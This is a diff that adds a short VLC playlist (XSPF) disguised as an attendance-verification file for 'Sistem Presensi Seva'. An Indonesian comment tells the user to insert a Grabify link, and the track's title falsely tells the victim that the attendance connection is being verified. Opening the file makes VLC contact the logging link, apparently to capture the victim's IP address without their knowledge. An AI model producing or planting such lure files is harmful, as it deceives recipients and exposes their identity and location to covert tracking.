@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<playlist xmlns="http://xspf.org" version="1">
+    <title>Sistem Presensi Seva</title>
+    <trackList>
+        <track>
+            <!-- GANTI LINK DI BAWAH INI DENGAN "NEW URL" DARI GRABIFY -->
+            <location>https://grabify.link</location>
+            <title>Memverifikasi Koneksi Presensi...</title>
+            <extension application="http://videolan.org">
+                <vlc:id>0</vlc:id>
+                <!-- Mengatur agar VLC tidak loading terlalu lama -->
+                <vlc:option>network-caching=100</vlc:option>
+            </extension>
+        </track>
+    </trackList>
+</playlist>
